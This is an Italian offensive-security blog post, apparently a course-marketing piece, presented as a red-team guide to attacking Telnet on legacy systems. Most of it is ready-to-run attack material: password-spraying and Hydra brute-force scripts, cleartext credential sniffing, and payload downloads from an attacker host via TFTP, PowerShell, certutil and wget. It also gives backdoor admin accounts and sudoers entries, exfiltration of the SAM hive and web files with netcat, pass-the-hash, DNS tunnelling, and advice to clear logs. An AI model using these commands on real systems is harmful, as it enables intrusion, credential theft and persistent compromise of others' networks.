---
title: >-
    Telnet: sfruttare l''accesso remoto nei sistemi obsoleti
description: >-
  Telnet è ancora usato in ambienti legacy. Scopri come sfruttarlo per attacchi
  reali, accessi remoti e test su vecchi sistemi. Comandi e scenari pratici.
image: /telnet.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - telnet
  - '23'
  - ''
slug: "telnet"
---

# Telnet: Il Vecchio Maestro dell'Accesso Remoto - Guida Offensiva Completa

**Report Red Team | Ambiente Controllato Autorizzato**

Mentre il mondo corre verso SSH e connessioni cifrate, c'è un vecchio guerriero che ancora aspetta paziente sulla porta 23: Telnet. In un'operazione di Red Team, Telnet non è solo un protocollo legacy - è una **porta aperta su un passato più semplice**, dove l'autenticazione in chiaro e le sessioni non cifrate diventano il nostro più grande alleato. Questa è la guida che trasforma un servizio "obsoleto" in un'arma offensiva letale.

## Perché Telnet è Ancora Rilevante per un Attaccante

Telnet (RFC 854) è molto più di un protocollo terminale remoto. È una **finestra su sistemi che il tempo ha dimenticato**:

* Sistemi legacy che non supportano SSH
* Apparati di rete (router, switch) con configurazioni di fabbrica
* Sistemi embedded in ambienti industriali (SCADA, PLC)
* Server di test e sviluppo lasciati esposti per comodità

**Per l'attaccante, Telnet rappresenta tre opportunità:**

1. **Accesso diretto** senza complessi handshake crittografici
2. **Credential sniffing** facile grazie al traffico in chiaro
3. **Banner grabbing** immediato per fingerprinting del sistema

## Fase 1: Scoperta e Fingerprinting di Servizi Telnet

### Scansione Aggressiva con Nmap

```bash
# Scansione mirata alla porta 23
sudo nmap -sS -sV -p 23 192.168.1.0/24 -oN telnet_scan.txt

# Output tipico:
Nmap scan report for 192.168.1.25
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

### Banner Grabbing Avanzato

```bash
# Script NSE per informazioni dettagliate
sudo nmap -p 23 --script telnet-ntlm-info,telnet-encryption 192.168.1.25 -sV

# Banner grabbing manuale
nc -nv 192.168.1.25 23
echo "" | timeout 2 nc 192.168.1.25 23

# Output di un sistema Windows con Telnet:
Microsoft Telnet Server
Welcome to Microsoft Telnet Server
login:
```

### Identificazione di Sistemi Specifici

```bash
# Script personalizzato per fingerprinting
#!/bin/bash
TARGET="192.168.1.25"
echo "[*] Testing Telnet service on $TARGET"

# Prova connessione e cattura banner
banner=$(timeout 3 nc $TARGET 23 2>/dev/null | head -5)

if [[ $banner == *"Cisco"* ]]; then
    echo "[!] Sistema identificato: Cisco Device"
elif [[ $banner == *"Microsoft"* ]]; then
    echo "[!] Sistema identificato: Windows Server"
elif [[ $banner == *"Linux"* ]] || [[ $banner == *"Ubuntu"* ]]; then
    echo "[!] Sistema identificato: Linux/Unix"
else
    echo "[?] Sistema sconosciuto - Analisi banner:"
    echo "$banner"
fi
```

## Fase 2: Connessione e Accesso Offensivo

### Tecniche di Connessione Base

```bash
# Connessione semplice
telnet 192.168.1.25

# Connessione su porta non standard
telnet 192.168.1.25 2323

# Connessione con timeout
timeout 10 telnet 192.168.1.25 23
```

### Gestione delle Sessioni

```bash
# Escape character per controllare la sessione
# Durante una sessione Telnet, premere:
Ctrl + ]  # Entra nel prompt Telnet

# Comandi disponibili nel prompt:
telnet> status    # Mostra stato connessione
telnet> mode      # Cambia modalità linea/character
telnet> send      # Invia comandi speciali
telnet> close     # Chiude connessione corrente
telnet> quit      # Esce completamente
```

## Fase 3: Attacchi di Autenticazione e Credential Testing

### Password Spraying con Telnet

```bash
#!/bin/bash
# telnet_spray.sh - Password spraying su servizi Telnet
TARGET="192.168.1.25"
USER_LIST="users.txt"
PASS_LIST="passwords.txt"

echo "[*] Starting Telnet password spray on $TARGET"

while read user; do
    while read pass; do
        echo "[*] Trying: $user:$pass"
        
        # Crea uno script per l'automazione
        echo -e "$user\n$pass\nwhoami\n" | \
        timeout 5 telnet $TARGET 23 2>/dev/null | \
        grep -i "welcome\|login\|incorrect\|failed" | head -5
        
        sleep 1  # Evita lockout account
    done < "$PASS_LIST"
done < "$USER_LIST"
```

### Bruteforce Automatizzato

```bash
# Usando Hydra per attacchi Telnet
hydra -L users.txt -P passwords.txt telnet://192.168.1.25

# Con specifica del servizio
hydra -l administrator -P rockyou.txt 192.168.1.25 telnet

# Opzioni avanzate Hydra
hydra -L users.txt -P passwords.txt \
  -t 4 -w 10 -f \
  telnet://192.168.1.25:23
```

### Sniffing Credenziali in Rete

```bash
# Telnet invia tutto in chiaro - sniffing facile con tcpdump
sudo tcpdump -i eth0 -A -n port 23 | grep -A5 -B5 "login\|password"

# Output catturato:
login: admin
password: P@ssw0rd123
```

## Fase 4: Post-Exploitation su Sistemi Telnet

### Comandi Base per Enumeration

```bash
# Una volta autenticati, enumerazione del sistema
# Windows:
systeminfo
net users
net localgroup administrators
ipconfig /all
netstat -ano

# Linux/Unix:
whoami
id
uname -a
cat /etc/passwd
ifconfig
netstat -tulpn
```

### Upload di Tool Offensivi

```bash
# Metodo 1: TFTP
# Sulla macchina attaccante:
sudo apt install atftpd
sudo mkdir /tftp
sudo chmod 777 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/
sudo atftpd --daemon --port 69 /tftp

# Dalla sessione Telnet (Windows):
tftp -i 192.168.1.100 GET nc.exe C:\\Windows\\Temp\\nc.exe

# Metodo 2: PowerShell download
# Dalla sessione Telnet (Windows):
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.1.100/hackita.exe','C:\\Windows\\Temp\\hackita.exe')"

# Metodo 3: Certutil (Windows)
certutil -urlcache -split -f http://192.168.1.100/hackita.exe C:\\Windows\\Temp\\hackita.exe
```

### Creazione Backdoor Persistenti

```bash
# Windows - Aggiunta utente amministratore
net user hackita P@ssw0rd123! /add
net localgroup administrators hackita /add

# Windows - Abilitazione Telnet (se disabilitato)
dism /online /Enable-Feature /FeatureName:TelnetClient
sc config TlntSvr start= auto
net start TlntSvr

# Linux - Aggiunta utente con sudo
useradd -m -s /bin/bash hackita
echo "hackita:P@ssw0rd123!" | chpasswd
echo "hackita ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

## Fase 5: Movimento Laterale attraverso Telnet

### Pivot attraverso Host Compromessi

```bash
# Scenario: Attaccante -> Host A (via Telnet) -> Host B (rete interna)

# Passo 1: Su Host A, setup tunnel
# Windows:
plink.exe -ssh -L 3389:192.168.2.100:3389 192.168.1.100 -N

# Linux:
ssh -L 3389:192.168.2.100:3389 192.168.1.100 -N

# Passo 2: Port forwarding con Netcat (se SSH non disponibile)
# Su Host A:
nc -lvp 5555 -e "nc 192.168.2.100 3389"

# Passo 3: Attaccante si connette al tunnel
rdesktop 192.168.1.25:5555
```

### Esfiltrazione Dati via Telnet

```bash
# Metodo 1: Compressione e invio
# Sul target (Linux):
tar czf - /var/www/html | base64 | \
while read line; do 
    echo "$line" | nc 192.168.1.100 4444
done

# Sull'attaccante:
nc -nlvp 4444 | base64 -d > stolen_data.tar.gz

# Metodo 2: Dati sensibili Windows
# Sul target (Windows):
type C:\Windows\System32\config\SAM | nc 192.168.1.100 4444
reg save HKLM\SAM C:\Windows\Temp\sam.save
certutil -encode C:\Windows\Temp\sam.save C:\Windows\Temp\sam.b64
type C:\Windows\Temp\sam.b64 | nc 192.168.1.100 4444
```

## Fase 6: Tecniche Avanzate di Evasione

### Telnet attraverso Proxy

```bash
# Utilizzo di corkscrew per Telnet attraverso HTTP proxy
telnet -E none -L /usr/bin/corkscrew 192.168.1.25 23 \
  proxy.company.com 8080

# Con netcat attraverso SOCKS
nc -x socks5://192.168.1.50:1080 192.168.1.25 23
```

### Tunneling Telnet su Protocolli Alternativi

```bash
# DNS Tunneling per bypassare firewall
# Sul target:
dnscat2 --dns server=192.168.1.100,port=53 --secret=mysecret

# Sull'attaccante:
dnscat2-server --dns-port=53 --secret=mysecret
```

### Steganografia in Sessioni Telnet

```bash
# Nascondere comandi in output apparentemente normale
# Script per inviare comandi camuffati
#!/bin/bash
TARGET="192.168.1.25"
USER="admin"
PASS="password"

# Comando camuffato come output di sistema
(
echo "$USER"
echo "$PASS"
echo "echo 'Starting system update...'"
echo "sleep 2"
echo "wget http://192.168.1.100/hackita.exe -O /tmp/hackita.exe"
echo "chmod +x /tmp/hackita.exe"
echo "echo 'Update complete.'"
) | telnet $TARGET 23
```

## Scenario di Attacco Completo

**Contesto**: Rete aziendale con server legacy Windows 2003 accessibile via Telnet.

**Step 1 - Scoperta e Accesso:**

```bash
nmap -p 23 192.168.1.0/24
# Trovato: 192.168.1.30 con Telnet aperto

telnet 192.168.1.30
# Banner: Windows Server 2003 Telnet Server

# Credenziali di default (ricerca su exploit-db)
Administrator:Administrator
```

**Step 2 - Post-Exploitation Iniziale:**

```bash
# Una volta autenticato:
systeminfo
# Conferma: Windows Server 2003 SP2

net user
# Utenti: Administrator, Guest, MSSQL$SQL2005

net localgroup administrators
# Administrator è nel gruppo
```

**Step 3 - Download Tool Offensivi:**

```bash
# Creare connessione TFTP dall'attacker
# Sulla macchina compromessa:
tftp -i 192.168.1.100 GET nc.exe C:\WINDOWS\Temp\nc.exe
tftp -i 192.168.1.100 GET hackita.exe C:\WINDOWS\Temp\hackita.exe

# Eseguire hackita.exe per persistence
C:\WINDOWS\Temp\hackita.exe install --service-name="WindowsUpdate" --startup=auto
```

**Step 4 - Movimento Laterale:**

```bash
# Scan rete interna dal server compromesso
C:\WINDOWS\Temp\nc.exe -zv 10.0.0.1 445 2>&1 | find "succeeded"

# Trovato DC: 10.0.0.10
# Pass-the-Hash con credenziali catturate
C:\WINDOWS\Temp\hackita.exe pth --target 10.0.0.10 --hash aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
```

**Step 5 - Esfiltrazione Dati:**

```bash
# Backup del database SAM
reg save HKLM\SAM C:\WINDOWS\Temp\sam.save
reg save HKLM\SYSTEM C:\WINDOWS\Temp\system.save

# Compressione e invio
"C:\Program Files\WinRAR\Rar.exe" a -hpP@ssw0rd123 C:\WINDOWS\Temp\creds.rar C:\WINDOWS\Temp\sam.save C:\WINDOWS\Temp\system.save

# Invio all'attaccante
C:\WINDOWS\Temp\nc.exe -nv 192.168.1.100 4444 < C:\WINDOWS\Temp\creds.rar
```

## Automazione con Script Offensivi

### Scanner e Exploiter Automatico

```python
#!/usr/bin/env python3
"""
Telnet Offensive Automation Tool
Per uso esclusivo in ambienti controllati autorizzati
"""

import telnetlib
import socket
import threading
from queue import Queue
import time

class TelnetAttackFramework:
    def __init__(self, target_ip, target_port=23):
        self.target_ip = target_ip
        self.target_port = target_port
        self.credentials = []
        self.results = {}
    
    def banner_grab(self):
        """Cattura banner del servizio Telnet"""
        try:
            tn = telnetlib.Telnet(self.target_ip, self.target_port, timeout=5)
            banner = tn.read_until(b"login:", timeout=3)
            tn.close()
            return banner.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Error: {str(e)}"
    
    def brute_force(self, username, password):
        """Tentativo di autenticazione"""
        try:
            tn = telnetlib.Telnet(self.target_ip, self.target_port, timeout=5)
            
            # Attesa prompt login
            tn.read_until(b"login:", timeout=3)
            tn.write(username.encode('ascii') + b"\n")
            
            # Attesa prompt password
            tn.read_until(b"Password:", timeout=3)
            tn.write(password.encode('ascii') + b"\n")
            
            # Verifica accesso
            time.sleep(1)
            tn.write(b"whoami\n")
            result = tn.read_very_eager().decode('utf-8', errors='ignore')
            tn.close()
            
            if "incorrect" not in result.lower() and "fail" not in result.lower():
                return True, result
            return False, result
            
        except Exception as e:
            return False, str(e)
    
    def execute_command(self, username, password, command):
        """Esecuzione remota di comandi"""
        try:
            tn = telnetlib.Telnet(self.target_ip, self.target_port, timeout=5)
            
            tn.read_until(b"login:", timeout=3)
            tn.write(username.encode('ascii') + b"\n")
            
            tn.read_until(b"Password:", timeout=3)
            tn.write(password.encode('ascii') + b"\n")
            
            time.sleep(1)
            tn.write(command.encode('ascii') + b"\n")
            
            result = tn.read_until(b"login:", timeout=5)
            tn.close()
            
            return result.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"Error: {str(e)}"

# Utilizzo
if __name__ == "__main__":
    target = "192.168.1.30"
    scanner = TelnetAttackFramework(target)
    
    print(f"[*] Banner grabbing {target}")
    banner = scanner.banner_grab()
    print(f"[+] Banner: {banner[:200]}...")
    
    # Test credenziali comuni
    credentials = [("admin", "admin"), ("administrator", "administrator"), 
                   ("root", "root"), ("guest", "guest")]
    
    for user, passwd in credentials:
        print(f"[*] Testing {user}:{passwd}")
        success, result = scanner.brute_force(user, passwd)
        if success:
            print(f"[!] SUCCESS: {user}:{passwd}")
            break
```

## Considerazioni Finali per l'Operatore

Telnet rappresenta un'anomalia nel mondo moderno della sicurezza: un protocollo che per design **regala informazioni all'attaccante**. Le sessioni non cifrate, le credenziali in chiaro e i banner informativi sono doni che pochi altri servizi offrono così generosamente.

**Le 5 Regole d'Oro del Red Teamer con Telnet:**

1. **Sniff First**: Prima di attaccare, sniffa il traffico - potresti catturare credenziali valide
2. **Banner is Gold**: Il banner ti dice tutto - OS, versione, configurazioni
3. **Default is Deadly**: Le credenziali di default funzionano più spesso di quanto pensi
4. **Pivot Potential**: Un accesso Telnet può essere il trampolino per la rete interna
5. **Clean Your Tracks**: Telnet logga tutto - cancella i log quando possibile

**Tool Essenziali per Attacchi Telnet:**

* **Nmap**: Scansione e fingerprinting
* **Hydra/Medusa**: Bruteforce automatizzato
* **Netcat**: Tunneling e trasferimento file
* **Tcpdump/Wireshark**: Sniffing credenziali
* **Custom Scripts**: Automazione attacchi specifici

***

### Vuoi Padroneggiare le Tecniche di Attacco Legacy e Moderne?

Telnet è solo un esempio di come servizi apparentemente "obsoleti" possano diventare vettori di attacco critici. In un'operazione reale di Red Team, la capacità di sfruttare ogni possibile vettore - moderno o legacy - è ciò che separa i principianti dai professionisti.

**Hackita** offre la formazione completa per diventare operatore di sicurezza offensiva:

* **Corsi di Red Teaming Realistico**: Impara a condurre operazioni complete in ambienti eterogenei
* **Laboratori con Sistemi Legacy**: Pratica su Windows Server 2003, Cisco IOS legacy, sistemi SCADA
* **Mentorship 1:1**: Sessioni personalizzate con esperti del settore
* **Formazione Aziendale**: Programmi su misura per team di penetration test

**I nostri percorsi includono:**

* Attacchi a sistemi legacy (Telnet, FTP, SNMP)
* Post-exploitation avanzato in ambienti Windows/Linux
* Movement laterale in reti segmentate
* Tecniche di evasione e persistenza
* Reporting professionale per clienti

[Scopri i nostri servizi formativi](https://hackita.it/servizi/) e trasforma la tua passione per la sicurezza in una carriera professionale.

**Supporta la Community Offensiva Italiana:**
La conoscenza è potere, ma condivisa è rivoluzione. [Supporta Hackita con una donazione](https://hackita.it/supporto/) per aiutarci a mantenere i laboratori, sviluppare nuovi corsi e creare una community forte di professionisti della sicurezza.

**Risorse Consigliate:**

* [Telnet Protocol Specification - RFC 854](https://tools.ietf.org/html/rfc854)
* [OWASP Testing Guide - Testing for Telnet](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_SSL_TLS_Ciphers)
* [MITRE ATT\&CK - T1021 Remote Services](https://attack.mitre.org/techniques/T1021/)
* [Telnet Exploitation - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet)

**Ricorda:** Le tecniche descritte devono essere utilizzate solo in ambienti controllati, con autorizzazione esplicita, a scopo di apprendimento e miglioramento delle difese.

**Formati. Sperimenta. Previeni.**

[Hackita - Excellence in Offensive Security Training](https://hackita.it)
